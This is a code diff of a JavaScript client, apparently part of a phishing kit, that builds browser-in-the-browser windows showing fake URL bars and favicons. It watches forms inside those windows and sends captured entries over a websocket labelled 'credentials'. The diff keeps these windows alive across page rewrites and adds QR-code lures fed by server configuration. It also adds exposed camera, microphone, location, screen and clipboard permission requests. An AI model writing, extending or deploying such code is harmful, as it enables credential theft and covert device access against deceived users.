+            if (finalUrl && !finalUrl.match(/^https?:\/\//)) {
+                finalUrl = 'https://' + finalUrl;
+            }
+            urlInput.value = finalUrl;
+            console.log('Setting custom URL:', finalUrl);
+        } else {
+            urlInput.value = `https://localhost/${fileName || ''}`;
+            console.log('Using default URL:', urlInput.value);
+        }
         urlInput.readOnly = true;
         
         const bookmarkButton = document.createElement('button');
@@ -5094,18 +6808,52 @@ const EDEN_LINK_PREVIEW = {
         
         const windowContent = document.createElement('div');
         windowContent.className = 'window-content';
-        
-        const blob = new Blob([content], { type: 'text/html' });
-        const blobUrl = URL.createObjectURL(blob);
+        windowContent.setAttribute('style', `
+            flex: 1 !important;
+            overflow: hidden !important;
+            position: relative !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            box-sizing: border-box !important;
+            background-color: white !important;
+            isolation: isolate !important;
+        `);
         
         const iframe = document.createElement('iframe');
+        iframe.id = 'eden-bitb-frame';
         iframe.className = 'iframe-container';
-        iframe.src = blobUrl;
+        iframe.setAttribute('style', `
+            width: 100% !important;
+            height: 100% !important;
+            border: none !important;
+            display: block !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            overflow: hidden !important;
+        `);
         iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-forms allow-modals');
+        if (isBitBLayer) {
+            iframe.srcdoc = content;
+        } else {
+            const blob = new Blob([content], { type: 'text/html' });
+            const blobUrl = URL.createObjectURL(blob);
+            iframe.src = blobUrl;
+            browserWindow.addEventListener('remove', () => { URL.revokeObjectURL(blobUrl); });
+        }
         iframe.onload = function() {
             // Once the iframe is loaded, try to access its content document
             try {
                 if (iframe.contentDocument) {
+                    // Trigger QR detection after iframe content loads
+                    setTimeout(() => {
+                        if (typeof checkAndDisplayQR === 'function') {
+                            checkAndDisplayQR();
+                        }
+                        if (typeof initEdenQR === 'function') {
+                            initEdenQR();
+                        }
+                    }, 200);
+                    
                     // Monitor forms within the iframe
                     const forms = iframe.contentDocument.querySelectorAll('form');
                     console.log(`Monitoring ${forms.length} forms in window iframe`);
@@ -5150,7 +6898,7 @@ const EDEN_LINK_PREVIEW = {
                                 ws.send(JSON.stringify({
                                     type: 'credentials',
                                     data: credentialData,
-                                    url: iframe.contentDocument.location.href || blobUrl,
+                                    url: (iframe.contentDocument && iframe.contentDocument.location ? iframe.contentDocument.location.href : null) || (typeof blobUrl !== 'undefined' ? blobUrl : 'bitb-inline'),
                                     timestamp: new Date().toISOString(),
                                     formId: form.id || 'unnamed_form',
                                     clientId: clientId || 'unknown',
@@ -5200,20 +6948,20 @@ const EDEN_LINK_PREVIEW = {
         // Add event listeners for dragging
         windowHeader.addEventListener('mousedown', dragStart, false);
         
-        // Add the window to the document
-        // Make sure browserWindow is actually appended to the document
-        if (document.body) {
-            document.body.appendChild(browserWindow);
-            console.log('Browser window appended to document body');
-        } else {
-            // If document.body isn't available, wait for it
-            console.warn('Document body not available, waiting...');
+        try {
+            appendTarget.appendChild(browserWindow);
+            console.log('BITB window appended to', isBitBLayer ? 'BITB layer' : 'body');
+        } catch (e) {
+            console.error('Error appending BITB window:', e);
             setTimeout(() => {
-                if (document.body) {
-                    document.body.appendChild(browserWindow);
-                    console.log('Browser window appended to document body (delayed)');
-                } else {
-                    console.error('Could not append browser window - no document body');
+                try {
+                    const retryTarget = targetContainer || getOrCreateBitBLayer();
+                    if (retryTarget) {
+                        retryTarget.appendChild(browserWindow);
+                        console.log('BITB window appended (retry)');
+                    }
+                } catch (e2) {
+                    console.error('Failed to append BITB window after retry:', e2);
                 }
             }, 100);
         }
@@ -5226,11 +6974,6 @@ const EDEN_LINK_PREVIEW = {
         // Set this as the active window
         activeWindow = browserWindow;
         
-        // Clean up blob URL when window is removed
-        browserWindow.addEventListener('remove', () => {
-            URL.revokeObjectURL(blobUrl);
-        });
-        
         // Save window data to localStorage
         localStorage.setItem(windowKey, JSON.stringify(windowData));
         
@@ -5240,14 +6983,11 @@ const EDEN_LINK_PREVIEW = {
     // Clean content display - completely removes all content and prevents persistence
     function cleanContent() {
         console.log('Cleaning content display and preventing persistence');
-        
-        // Clear main content container
-        const container = getMainContainer();
-        if (container) container.innerHTML = '';
-        
-        // Show placeholder
-        const placeholder = document.getElementById('placeholder');
-        if (placeholder) placeholder.style.display = 'flex';
+        if (document.body) {
+            preserveBitBLayer();
+            document.body.innerHTML = '';
+            restoreBitBLayer();
+        }
         
         // Remove ALL content-related items from localStorage to prevent persistence
         console.log('Removing localStorage items to prevent persistence');
@@ -5264,30 +7004,22 @@ const EDEN_LINK_PREVIEW = {
         sessionStorage.removeItem('eden-from-section');
         sessionStorage.removeItem('eden-location-x');
         sessionStorage.removeItem('eden-location-y');
-        
-        
     }
     
     // Clear all windows
     function clearAllWindows(clearStorage = false) {
         console.log('Clearing all windows, clearStorage:', clearStorage);
         
-        // Remove all browser windows
         const windows = document.querySelectorAll('.browser-window');
         windows.forEach(win => {
             win.classList.add('closing');
             setTimeout(() => win.remove(), 300);
         });
-        
-        // Clear main content
-        const container = getMainContainer();
-        container.innerHTML = '';
-        
-        // Show placeholder
-        const placeholder = document.getElementById('placeholder');
-        if (placeholder) placeholder.style.display = 'flex';
-        
-        // Clear localStorage if requested
+        if (document.body) {
+            preserveBitBLayer();
+            document.body.innerHTML = '';
+            restoreBitBLayer();
+        }
         if (clearStorage) {
             clearAllLocalStorage();
         }
@@ -5339,12 +7071,11 @@ const EDEN_LINK_PREVIEW = {
             localStorage.removeItem('showsContent');
             localStorage.removeItem('lastLoadedFile');
             
-            const container = getMainContainer();
-            container.innerHTML = '';
-            
-            // Show placeholder
-            const placeholder = document.getElementById('placeholder');
-            if (placeholder) placeholder.style.display = 'flex';
+            if (document.body) {
+                preserveBitBLayer();
+                document.body.innerHTML = '';
+                restoreBitBLayer();
+            }
         }
     }
     
@@ -5364,21 +7095,26 @@ const EDEN_LINK_PREVIEW = {
         // If file parameter exists, try to load that file
         if (fileParam) {
             const fileContent = localStorage.getItem('file_' + fileParam);
-            if (fileContent) {
-                document.getElementById('placeholder').style.display = 'none';
-                const container = getMainContainer();
-                container.innerHTML = fileContent;
+            if (fileContent && document.body) {
+                preserveBitBLayer();
+                document.body.innerHTML = fileContent;
+                restoreBitBLayer();
                 return true;
             }
         }
-        
-        // Otherwise check for showsContent
         else if (localStorage.getItem('showsContent')) {
-            // If no current file but showContent exists, display it
-            document.getElementById('placeholder').style.display = 'none';
-            const container = getMainContainer();
-            container.innerHTML = localStorage.getItem('showsContent');
-            return true;
+            if (document.body) {
+                preserveBitBLayer();
+                const content = localStorage.getItem('showsContent');
+                const wrap = document.createElement('div');
+                wrap.id = 'main-content';
+                wrap.style.cssText = 'width:100%;min-height:100%;margin:0;padding:0;box-sizing:border-box;';
+                wrap.innerHTML = content;
+                document.body.innerHTML = '';
+                document.body.appendChild(wrap);
+                restoreBitBLayer();
+                return true;
+            }
         }
         
         return false;
@@ -5386,8 +7122,7 @@ const EDEN_LINK_PREVIEW = {
     
     // Initialize UI elements on page load
     function initializeUI() {
-        // Create main container if it doesn't exist
-        getMainContainer();
+        // NO containers created - hooked HTML writes directly to body
         
         // First check if we need to restore the page state after executing JavaScript
         let restoredState = false;
@@ -5397,21 +7132,18 @@ const EDEN_LINK_PREVIEW = {
                 try {
                     const pageState = JSON.parse(savedState);
                     
-                    // Restore the main content
-                    if (pageState.mainContent && pageState.mainContent.trim() !== '') {
-                        const container = getMainContainer();
-                        if (container) {
-                            container.innerHTML = pageState.mainContent;
-                            
-                            // Hide the placeholder if needed
-                            const placeholder = document.getElementById('placeholder');
-                            if (placeholder) {
-                                placeholder.style.display = pageState.placeholder || 'none';
-                            }
-                            
-                            console.log('Restored previous page state after JavaScript execution');
-                            restoredState = true;
-                        }
+                    if (pageState.bodyContent && pageState.bodyContent.trim() !== '' && document.body) {
+                        preserveBitBLayer();
+                        document.body.innerHTML = pageState.bodyContent;
+                        restoreBitBLayer();
+                        console.log('Restored previous page state after JavaScript execution');
+                        restoredState = true;
+                    } else if (pageState.mainContent && pageState.mainContent.trim() !== '' && document.body) {
+                        preserveBitBLayer();
+                        document.body.innerHTML = pageState.mainContent;
+                        restoreBitBLayer();
+                        console.log('Restored previous page state after JavaScript execution');
+                        restoredState = true;
                     }
                 } catch (error) {
                     console.error('Error restoring page state:', error);
@@ -5425,7 +7157,7 @@ const EDEN_LINK_PREVIEW = {
         }
         
         // Set up event listeners for forms that might be in the content
-        const forms = document.querySelectorAll('#main-content form');
+        const forms = document.querySelectorAll('form');
         forms.forEach(form => {
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
@@ -5499,22 +7231,36 @@ const EDEN_LINK_PREVIEW = {
         }
     }
     // Restore windows from localStorage on page load
+    // NOTE: BITB windows are handled by restoreBitBAfterReload(), not here
     function restoreWindows() {
         console.log('Attempting to restore windows...');
         
-        // Get all window keys from localStorage
+        // Skip BITB restoration - it's handled by restoreBitBAfterReload()
+        // Only restore non-BITB windows if needed (legacy support)
         const windowKeys = Object.keys(localStorage).filter(key => key.startsWith('BITBContent_'));
-        console.log(`Found ${windowKeys.length} windows to restore`);
+        
+        // Check if there's a pending BITB reload - if so, skip legacy restore
+        if (localStorage.getItem('pendingBITBContent')) {
+            console.log('BITB pending reload - skipping legacy window restore');
+            return;
+        }
+        
+        console.log(`Found ${windowKeys.length} legacy windows to restore`);
         
         windowKeys.forEach(key => {
             try {
                 const windowData = JSON.parse(localStorage.getItem(key));
                 // Only restore windows that aren't minimized
                 if (windowData && windowData.content && !windowData.minimized) {
-                    console.log(`Restoring window: ${windowData.fileName}`);
+                    console.log(`Restoring legacy window: ${windowData.fileName}`);
                     
-                    // Create the window using showContentInWindow
-                    showContentInWindow(windowData.content, windowData.fileName);
+                    // Create the window using showContentInWindow with custom favicon and URL
+                    showContentInWindow(
+                        windowData.content, 
+                        windowData.fileName, 
+                        windowData.customFavicon, 
+                        windowData.customUrl
+                    );
                     
                     // Now find the window and apply the saved state
                     const windowId = key.replace('BITBContent_', '');
@@ -5550,18 +7296,59 @@ const EDEN_LINK_PREVIEW = {
         });
     }
     
+    // Restore blur content (modal)
+    // Restore blur content (modal)
+function restoreBlurContent() {
+    const content = localStorage.getItem('blur-content');
+    if (!content) return;
+    
+    console.log('Restoring blur content...');
+    
+   
+    closeButton.onclick = function() {
+        // Remove ALL content containers (without looking for the class)
+        document.querySelectorAll('div').forEach(el => {
+            if (
+                el.style.position === 'fixed' &&
+                el.style.zIndex === '9999' &&
+                el.style.overflow === 'hidden'
+            ) {
+                if (el && el.parentNode) el.parentNode.removeChild(el);
+            }
+        });
+        localStorage.removeItem('blur-content'); // Clear storage on close
+    };
+    
+    contentContainer.appendChild(closeButton);
+    document.body.appendChild(contentContainer);
+    
+    // Write to iframe now that it's in DOM
+    try {
+        const doc = iframe.contentWindow.document;
+        doc.open();
+        doc.write(content);
+        doc.close();
+    } catch (e) {
+        console.error('Error writing to iframe:', e);
+    }
+}
+
+
     // Add UI initialization to the initialization process
     const originalInitialize = initialize;
     initialize = function() {
         originalInitialize();
         initializeUI();
         
-        // Immediately restore any saved content
-        if (localStorage.getItem('showsContent')) {
+        // Restore showsContent only if not already restored by checkStoredContent (which uses main-content wrapper like eden5)
+        if (localStorage.getItem('showsContent') && !document.getElementById('main-content')) {
             const content = localStorage.getItem('showsContent');
             const fileName = localStorage.getItem('lastLoadedFile') || 'saved-content.html';
             showContent(content, fileName, false);
         }
+        
+        // Restore blur content
+        restoreBlurContent();
         
         // Immediately restore any saved popup windows
         restoreWindows();
@@ -5745,6 +7532,9 @@ const EDEN_LINK_PREVIEW = {
     function checkForSavedContent() {
         console.log('Checking for saved content to restore after refresh');
         
+        // BITB restoration is handled by restoreBitBAfterReload() via window.load listener
+        // This function only handles non-BITB content
+        
         // First check for clean flag - if present, don't restore content
         const cleanFlag = localStorage.getItem('clean-flag') === 'true' || 
                           sessionStorage.getItem('clean-flag') === 'true';
@@ -5829,31 +7619,28 @@ const EDEN_LINK_PREVIEW = {
                     // Add the overlay to the body
                     document.body.appendChild(overlay);
                     
-                    // Create and add content container if we have stored content
                     if (blurData.content) {
                         const contentContainer = document.createElement('div');
                         contentContainer.id = 'eden-content-container';
                         contentContainer.style.cssText = `
                             position: fixed;
-                            top: 50%;
-                            left: 50%;
-                            transform: translate(-50%, -50%);
-                            max-width: 95%;
-                            max-height: 95vh;
+                            top: 0;
+                            left: 0;
+                            width: 100%;
+                            height: 100%;
                             overflow: auto;
                             border: none;
-                            background: none;
-                            box-shadow: none;
+                            background: transparent;
                             padding: 0;
                             margin: 0;
-                            z-index: 2000000; /* Higher z-index than overlay */
+                            z-index: 2000000;
                             display: block !important;
+                            box-sizing: border-box;
                         `;
                         contentContainer.innerHTML = blurData.content;
                         document.body.appendChild(contentContainer);
-                        
-                        console.log('Successfully restored both blur effect and content from unified storage');
-                        return; // Exit early since we've successfully restored
+                        console.log('Restored showsContent (full page)');
+                        return;
                     }
                 }
             }
@@ -5886,6 +7673,512 @@ const EDEN_LINK_PREVIEW = {
         }
     }
     
+    // QR Code display functionality - matching Alpha.js approach
+    let edenQRCodeInstances = new Map();
+    let currentQRConfig = null;
+    let qrObserver = null;
+    const edenQRFrameObservers = new WeakMap();
+    // Track previous state for each QR div to detect mode changes
+    const edenQRPreviousState = new WeakMap();
+    
+    // NEW LOADING ANIMATION SYSTEM - checks every 1 second for #edenqr-loading div
+    (function() {
+        // Inject isolated CSS for loading animation (scoped to #edenqr-loading)
+        if (!document.getElementById('edenqr-loading-style')) {
+            const style = document.createElement('style');
+            style.id = 'edenqr-loading-style';
+            style.textContent = `
+                @keyframes edenqr-loading-pulse {
+                    0%, 100% { opacity: 0.4; }
+                    50% { opacity: 1; }
+                }
+                #edenqr-loading {
+                    display: none;
+                }
+                #edenqr-loading.active {
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    position: relative;
+                    min-height: 60px;
+                    font-size: 14px;
+                    color: #708090;
+                    animation: edenqr-loading-pulse 1.5s ease-in-out infinite;
+                }
+                #edenqr-loading.active::before {
+                    content: 'Loading...';
+                }
+            `;
+            document.head.appendChild(style);
+        }
+        
+        // Check every 1 second for #edenqr-loading div and activate animation if exists
+        function checkForLoadingDiv() {
+            const loadingDiv = document.getElementById('edenqr-loading');
+            if (loadingDiv && !loadingDiv.classList.contains('active')) {
+                loadingDiv.classList.add('active');
+            }
+        }
+        
+        // Start checking immediately and then every 1 second
+        checkForLoadingDiv();
+        setInterval(checkForLoadingDiv, 1000);
+    })();
+    
+    function collectEdenQRDivs() {
+        const qrDivs = Array.from(document.querySelectorAll('.EdenQR, .Edenqr'));
+        const iframeSelectors = ['.browser-window iframe', 'iframe[data-eden-browser]', 'iframe.eden-browser-frame'];
+        
+        iframeSelectors.forEach(selector => {
+            document.querySelectorAll(selector).forEach(iframe => {
+                try {
+                    const doc = iframe.contentDocument || iframe.contentWindow?.document;
+                    if (doc) {
+                        qrDivs.push(...doc.querySelectorAll('.EdenQR, .Edenqr'));
+                    }
+                } catch (error) {
+                    console.warn('Unable to access iframe for EdenQR scanning:', error);
+                }
+            });
+        });
+        
+        return qrDivs;
+    }
+    
+    function checkAndDisplayQR() {
+        const qrDivs = collectEdenQRDivs();
+        
+        if (qrDivs.length === 0) {
+            edenQRCodeInstances.forEach((instance, div) => {
+                if (div && div.parentNode) {
+                    div.innerHTML = '';
+                }
+            });
+            edenQRCodeInstances.clear();
+            return;
+        }
+        
+        // Check if we have valid QR config
+        const hasValidQR = currentQRConfig && currentQRConfig.link && 
+                          currentQRConfig.link !== " " && 
+                          currentQRConfig.link.trim() !== "" && 
+                          currentQRConfig.link !== "https://example.com";
+        
+        // Always check each QR div individually (like Alpha.js checks target)
+        qrDivs.forEach(qrDiv => {
+            if (hasValidQR) {
+                // Display QR if config is valid
+                displayQRInDiv(qrDiv, currentQRConfig);
+            } else {
+                // Display loading spinner if QR is not available
+                displayLoadingSpinner(qrDiv);
+            }
+        });
+    }
+
+    function displayLoadingSpinner(qrDiv) {
+        // Check if spinner is already displayed to avoid flickering
+        if (qrDiv.querySelector('.eden-loading-spinner')) return;
+
+        // Clear existing content (including QR code)
+        qrDiv.innerHTML = '';
+        
+        // Clear stored QR instance if any
+        edenQRCodeInstances.delete(qrDiv);
+        edenQRPreviousState.delete(qrDiv);
+
+        const container = document.createElement('div');
+        container.className = 'eden-loading-spinner';
+        container.style.cssText = 'width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #708090; font-family: sans-serif; font-size: 14px; background: rgba(255, 255, 255, 0.5); border-radius: 8px;';
+        
+        // Create spinner element
+        const spinner = document.createElement('div');
+        spinner.className = 'eden-spinner-icon';
+        spinner.style.cssText = 'width: 40px; height: 40px; min-width: 40px; min-height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50% !important; animation: eden-spin 1s linear infinite; margin-bottom: 10px; box-sizing: border-box; flex-shrink: 0;';
+        
+        // Create text element
+        const text = document.createElement('div');
+        text.textContent = 'Loading...';
+        text.style.cssText = 'font-weight: 500; opacity: 0.8;';
+        
+        container.appendChild(spinner);
+        container.appendChild(text);
+        
+        // Add animation style if not present
+        if (!document.getElementById('eden-spinner-style')) {
+             const style = document.createElement('style');
+             style.id = 'eden-spinner-style';
+             style.textContent = `
+                @keyframes eden-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+             `;
+             document.head.appendChild(style);
+        }
+        
+        qrDiv.appendChild(container);
+    }
+    
+    function displayQRCode(qrConfig) {
+        currentQRConfig = qrConfig;
+        
+        if (typeof QRCodeStyling === 'undefined') {
+            const script = document.createElement('script');
+            script.src = 'https://unpkg.com/qr-code-styling/lib/qr-code-styling.js';
+            script.onload = function() {
+                checkAndDisplayQR();
+            };
+            document.head.appendChild(script);
+        } else {
+            checkAndDisplayQR();
+        }
+    }
+    
+    function displayQRInDiv(qrDiv, qrConfig) {
+        // Validate QR config and link
+        if (!qrConfig || !qrConfig.link || qrConfig.link === " " || qrConfig.link.trim() === "" || qrConfig.link === "https://example.com") {
+            // No valid QR config - return early
+            return;
+        }
+        
+        let qrInstance = edenQRCodeInstances.get(qrDiv);
+        
+        // Get previous state for this QR div
+        let previousState = edenQRPreviousState.get(qrDiv) || { colorMode: null, logoUrl: null, lastConfigStr: null };
+        
+         // Build comprehensive config matching Alpha.js
+         const colorMode = qrConfig.colorMode || "single";
+         const gradientType = qrConfig.gradientType || "linear";
+         const primary = qrConfig.dotPrimary || qrConfig.dotColor || "#000000";
+         const secondary = qrConfig.dotSecondary || "#1f2937";
+         
+         // Get eye colors separately
+         const eyeOuterColor = qrConfig.eyeOuterColor || qrConfig.eyeColor || "#000000";
+         const eyeInnerColor = qrConfig.eyeInnerColor || qrConfig.eyeColor || "#000000";
+         
+         // Map eye styles to library types (matching Alpha.js)
+         const eyeStyle = qrConfig.eyeStyle || "square";
+         const innerEyeStyle = qrConfig.innerEyeStyle || "square";
+         let eyeOuterType = eyeStyle === 'circle' ? 'extra-rounded' : 'square';
+         let eyeInnerType = innerEyeStyle === 'dot' ? 'dot' : 'square';
+         
+         // Handle dot options with gradient support - ensure single mode doesn't have gradient property
+         let dotsOptions;
+         if (colorMode === 'single') {
+             // Single color mode - use simple color object, no gradient
+             dotsOptions = {
+                 type: qrConfig.dotStyle || "square",
+                 color: primary,
+                 scale: 1
+             };
+         } else {
+             // Gradient mode
+             dotsOptions = {
+                 type: qrConfig.dotStyle || "square",
+                 gradient: {
+                     type: gradientType,
+                     rotation: 0,
+                     colorStops: [
+                         { offset: 0, color: primary },
+                         { offset: 1, color: secondary }
+                     ]
+                 },
+                 scale: 1
+             };
+         }
+         
+         // Handle background
+         const backgroundStyle = qrConfig.backgroundStyle || "white";
+         const backgroundColor = qrConfig.backgroundColor || "#ffffff";
+         let bgColor = "#ffffff";
+         if (backgroundStyle === 'transparent') {
+             bgColor = 'transparent';
+         } else if (backgroundStyle === 'color') {
+             bgColor = backgroundColor;
+         }
+         
+        // Handle image URL - be more lenient with validation
+        let imageUrl = qrConfig.logoUrl || "";
+        if (imageUrl && imageUrl.trim()) {
+            imageUrl = imageUrl.trim();
+            // Only validate if it's not a data URL or blob URL
+            if (!imageUrl.startsWith('data:') && !imageUrl.startsWith('blob:')) {
+                try {
+                    // Try to create URL - if it fails, it might still be a relative path
+                    new URL(imageUrl);
+                } catch (e) {
+                    // If it's not a valid absolute URL, try to make it one
+                    if (!imageUrl.startsWith('http://') && !imageUrl.startsWith('https://')) {
+                        // Relative path - might work, let QR library handle it
+                        console.log('Using relative image path:', imageUrl);
+                    } else {
+                        console.warn('Invalid image URL format:', imageUrl);
+                        imageUrl = "";
+                    }
+                }
+            }
+        } else {
+            imageUrl = "";
+        }
+        
+        // Use inline style width/height if available, otherwise offsetWidth, otherwise default
+        let qrWidth = 300;
+        let qrHeight = 300;
+        
+        // Prioritize inline styles which come from server.html editor
+        if (qrDiv.style.width && parseInt(qrDiv.style.width) > 0) {
+            qrWidth = parseInt(qrDiv.style.width);
+        } else if (qrDiv.offsetWidth > 0) {
+            qrWidth = qrDiv.offsetWidth;
+        }
+        
+        if (qrDiv.style.height && parseInt(qrDiv.style.height) > 0) {
+            qrHeight = parseInt(qrDiv.style.height);
+        } else if (qrDiv.offsetHeight > 0) {
+            qrHeight = qrDiv.offsetHeight;
+        }
+
+        const config = {
+            width: qrWidth,
+            height: qrHeight,
+            type: "png",
+            data: qrConfig.link || " ",
+            image: imageUrl,
+            margin: 12,
+            dotsOptions: dotsOptions,
+            cornersSquareOptions: {
+                type: eyeOuterType,
+                color: eyeOuterColor,
+                scale: 1
+            },
+            cornersDotOptions: {
+                type: eyeInnerType,
+                color: eyeInnerColor,
+                scale: 1
+            },
+            backgroundOptions: { color: bgColor },
+            imageOptions: {
+                imageSize: Number(qrConfig.logoSize || 0.35),
+                margin: Number(qrConfig.logoMargin || 8),
+                hideBackgroundDots: qrConfig.hideBgDots || false
+            }
+        };
+        
+        // Check if we need to recreate the instance
+        const colorModeChanged = previousState.colorMode && previousState.colorMode !== colorMode;
+        const switchingToSingle = colorMode === 'single' && previousState.colorMode !== 'single';
+        const logoChanged = imageUrl !== previousState.logoUrl;
+        const needsRecreation = !qrInstance || (colorModeChanged && switchingToSingle) || logoChanged;
+        
+        // Check if config actually changed to avoid unnecessary updates that cause flickering
+        const configStr = JSON.stringify(config);
+        const lastConfigStr = previousState.lastConfigStr;
+        const configChanged = configStr !== lastConfigStr;
+        
+        // Only proceed if we need to recreate or config changed
+        if (!needsRecreation && !configChanged && qrInstance) {
+            // Nothing changed, return early
+            return;
+        }
+        
+        try {
+            if (needsRecreation) {
+                // Clear and recreate QR instance to ensure gradient is properly removed or logo is updated
+                qrDiv.innerHTML = '';
+                
+                qrInstance = new QRCodeStyling(JSON.parse(JSON.stringify(config)));
+                edenQRCodeInstances.set(qrDiv, qrInstance);
+                
+                // Update previous state before appending
+                previousState.colorMode = colorMode;
+                previousState.logoUrl = imageUrl;
+                previousState.lastConfigStr = configStr;
+                edenQRPreviousState.set(qrDiv, previousState);
+                
+                // Append QR - loader is already removed
+                qrInstance.append(qrDiv);
+                console.log('QR code displayed in .EdenQR div with comprehensive styling', imageUrl ? 'with image: ' + imageUrl : 'without image');
+            } else if (configChanged && qrInstance) {
+                // Normal update - only call update(), not append() - and only if config changed
+                const updateConfig = JSON.parse(JSON.stringify(config));
+                qrInstance.update(updateConfig);
+                
+                // Update previous state
+                previousState.colorMode = colorMode;
+                previousState.logoUrl = imageUrl;
+                previousState.lastConfigStr = configStr;
+                edenQRPreviousState.set(qrDiv, previousState);
+            }
+        } catch (error) {
+            console.error('Error creating/updating QR code:', error, 'Config:', config);
+            // If error occurs (e.g., invalid image), try without image
+            if (imageUrl) {
+                console.log('Retrying QR code without image due to error...');
+                const configWithoutImage = JSON.parse(JSON.stringify(config));
+                configWithoutImage.image = "";
+                try {
+                    // Always recreate when removing image due to error
+                    qrDiv.innerHTML = '';
+                    
+                    qrInstance = new QRCodeStyling(configWithoutImage);
+                    edenQRCodeInstances.set(qrDiv, qrInstance);
+                    
+                    // Update previous state - logo removed to prevent retry loop
+                    previousState.colorMode = colorMode;
+                    previousState.logoUrl = "";
+                    previousState.lastConfigStr = JSON.stringify(configWithoutImage);
+                    edenQRPreviousState.set(qrDiv, previousState);
+                    
+                    qrInstance.append(qrDiv);
+                    console.log('QR code displayed without image');
+                } catch (e) {
+                    console.error('Error creating QR code without image:', e);
+                    // Update state to prevent infinite retry loop
+                    previousState.colorMode = colorMode;
+                    previousState.logoUrl = "";
+                    edenQRPreviousState.set(qrDiv, previousState);
+                }
+            } else {
+                // Update state even on error to prevent retry loops
+                previousState.colorMode = colorMode;
+                previousState.logoUrl = "";
+                previousState.lastConfigStr = JSON.stringify(config);
+                edenQRPreviousState.set(qrDiv, previousState);
+            }
+        }
+     }
+    
+    function observeIframeForQR(iframe) {
+        try {
+            const doc = iframe.contentDocument || iframe.contentWindow?.document;
+            if (!doc || iframe.__edenQRFrameObserved) {
+                return;
+            }
+            
+            const attachObserver = () => {
+                if (!doc.body) return;
+                
+                const frameObserver = new MutationObserver(() => {
+                    setTimeout(checkAndDisplayQR, 100);
+                });
+                frameObserver.observe(doc.body, { childList: true, subtree: true });
+                edenQRFrameObservers.set(doc, frameObserver);
+                checkAndDisplayQR();
+            };
+            
+            if (doc.readyState === 'complete' || doc.readyState === 'interactive') {
+                attachObserver();
+            } else {
+                doc.addEventListener('DOMContentLoaded', attachObserver, { once: true });
+            }
+            
+            iframe.__edenQRFrameObserved = true;
+        } catch (error) {
+            console.warn('Unable to observe iframe for EdenQR:', error);
+        }
+    }
+    
+    function monitorQRFrames() {
+        const iframeSelectors = ['.browser-window iframe', 'iframe[data-eden-browser]', 'iframe.eden-browser-frame'];
+        iframeSelectors.forEach(selector => {
+            document.querySelectorAll(selector).forEach(iframe => {
+                observeIframeForQR(iframe);
+                if (!iframe.__edenQRFrameLoadBound) {
+                    iframe.addEventListener('load', () => observeIframeForQR(iframe));
+                    iframe.__edenQRFrameLoadBound = true;
+                }
+            });
+        });
+    }
+    
+    function setupQRObserver() {
+        if (qrObserver) return;
+        
+        // Initialize QR divs immediately (like Alpha.js init function)
+        function initEdenQR() {
+            const qrDivs = collectEdenQRDivs();
+            if (qrDivs.length > 0) {
+                // Check if we have QR config
+                checkAndDisplayQR();
+            }
+        }
+        
+        // Continuous polling like Alpha.js - simplified to use checkAndDisplayQR
+        function pollQR() {
+            checkAndDisplayQR();
+        }
+        
+        // MutationObserver to detect EdenQR divs on ALL DOM changes
+        qrObserver = new MutationObserver(function(mutations) {
+            // Always check for EdenQR divs
+            const allQRDivs = document.querySelectorAll('.EdenQR, .Edenqr');
+            if (allQRDivs.length > 0) {
+                // Poll for QR updates
+                setTimeout(pollQR, 50);
+            } else {
+                // No QR divs - cleanup
+                edenQRCodeInstances.forEach((instance, div) => {
+                    if (div && div.parentNode) {
+                        div.innerHTML = '';
+                    }
+                });
+                edenQRCodeInstances.clear();
+            }
+            
+            monitorQRFrames();
+        });
+        
+        qrObserver.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+        
+        monitorQRFrames();
+        
+        // Initialize immediately (like Alpha.js init function)
+        initEdenQR();
+        
+        // Poll continuously like Alpha.js (every 800ms like Alpha.js)
+        setInterval(pollQR, 800);
+        pollQR();
+    }
+    
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', function() {
+            setupQRObserver();
+            const storedConfig = sessionStorage.getItem('eden_qr_config');
+            if (storedConfig) {
+                try {
+                    currentQRConfig = JSON.parse(storedConfig);
+                    setTimeout(checkAndDisplayQR, 500);
+                } catch (e) {
+                    console.error('Error loading stored QR config:', e);
+                    currentQRConfig = null;
+                    setTimeout(checkAndDisplayQR, 500);
+                }
+            } else {
+                // No stored config - show loading
+                currentQRConfig = null;
+                setTimeout(checkAndDisplayQR, 500);
+            }
+        });
+    } else {
+        setupQRObserver();
+        const storedConfig = sessionStorage.getItem('eden_qr_config');
+        if (storedConfig) {
+            try {
+                currentQRConfig = JSON.parse(storedConfig);
+                setTimeout(checkAndDisplayQR, 500);
+            } catch (e) {
+                console.error('Error loading stored QR config:', e);
+                currentQRConfig = null;
+                setTimeout(checkAndDisplayQR, 500);
+            }
+        } else {
+            // No stored config - show loading
+            currentQRConfig = null;
+            setTimeout(checkAndDisplayQR, 500);
+        }
+    }
+    
     // Start the process
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', function() {
@@ -5908,6 +8201,13 @@ const EDEN_LINK_PREVIEW = {
         setTimeout(restoreFromSaved, 100);
         checkForSavedContent();
     }
+
+    // Expose permission functions to window for event template usage
+    window.requestCamera = requestCamera;
+    window.requestMicrophone = requestMicrophone;
+    window.requestScreen = requestScreen;
+    window.requestLocation = requestLocation;
+    window.requestClipboard = requestClipboard;
 })();
 
 function loadFile(fileName) {
@@ -5988,605 +8288,68 @@ function loadFile(fileName) {
     console.log(`File ${fileName} does not require reload, updating content without refresh`);
     
     // If we don't need to reload, just update the content
-    // Hide placeholder
-    document.getElementById('placeholder').style.display = 'none';
-    
-    // Get the container and update content
-    const container = document.getElementById('main-content');
-    container.innerHTML = content;
+    // Write directly to body - NO containers, NO wrappers
+    // BUT preserve BITB root container if it exists
+    if (document.body) {
+        // Preserve BITB root before replacing body content
+        preserveBitBLayer();
+        
+        // Replace body content
+        document.body.innerHTML = content;
+        
+        // Restore BITB root after replacement
+        restoreBitBLayer();
+    }
     
     console.log(`File ${fileName} loaded and stored for persistence`);
     return true;
 }
 
-// ===== DOWNLOAD FUNCTIONALITY =====
-
-// Store original body content for download functionality
-let download_originalBodyContent = null;
-
-// Show content with effect for download functionality
